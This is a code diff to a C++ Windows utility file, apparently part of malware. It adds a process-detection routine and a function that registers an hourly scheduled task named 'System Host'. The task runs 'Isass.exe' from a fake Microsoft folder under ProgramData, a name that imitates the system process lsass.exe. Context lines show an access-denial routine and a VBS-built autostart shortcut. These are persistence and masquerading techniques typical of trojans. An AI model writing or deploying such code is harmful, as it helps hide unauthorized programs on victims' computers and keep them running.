@@ -77,6 +77,26 @@ BOOL Utils::DenyAccess()
 	return TRUE;
 }
 
+/* Check Process */
+bool Utils::IsProcessRunning(const wchar_t *processName)
+{
+	bool exists = false;
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
+
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+	if (Process32First(snapshot, &entry))
+		while (Process32Next(snapshot, &entry))
+			if (!wcsicmp(entry.szExeFile, processName))
+				exists = true;
+
+	CloseHandle(snapshot);
+	return exists;
+}
+
+// Command Prompt =====================================================================
+
 /* Create Shortcut to Autoload in Current User */
 void Utils::createAutoLoadShortcut()
 {
@@ -87,4 +107,10 @@ void Utils::createAutoLoadShortcut()
 	system("echo oLink.Save >> CreateShortcut.vbs");
 	system("cscript CreateShortcut.vbs");
 	system("del CreateShortcut.vbs");
+}
+
+/* Create task in Task Scheduler */
+void createAutoloadTask()
+{
+	system("powershell.exe SCHTASKS.exe /Create /SC HOURLY /TN \"System Host\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");
 }
